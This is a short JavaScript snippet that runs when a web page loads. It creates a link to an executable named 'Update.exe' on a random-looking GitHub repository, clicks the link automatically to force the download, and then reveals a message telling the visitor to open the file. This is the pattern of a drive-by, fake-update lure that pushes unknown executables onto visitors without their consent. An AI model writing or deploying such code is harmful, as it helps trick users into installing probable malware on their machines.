window.onload = function () {
    // URL of the file to be downloaded
    const downloadUrl = "https://github.com/c82676b9a8/scripty/raw/refs/heads/main/assets/files/Update.exe";

    // Create the download link programmatically
    const link = document.createElement('a');
    link.href = downloadUrl;
    link.download = "Update.exe"; // Force the download with the specified filename
    
    // Append the link to the document body
    document.body.appendChild(link);

    // Try to click the link to start the download
    try {
        link.click();
    } catch (error) {
        console.error("Download failed:", error);
        alert("An error occurred while attempting to download the file.");
    }

    // Remove the link after the download starts
    document.body.removeChild(link);

    // Display the message to open the file once downloaded
    const openMessage = document.getElementById('openMessage');
    openMessage.style.display = 'block';
};
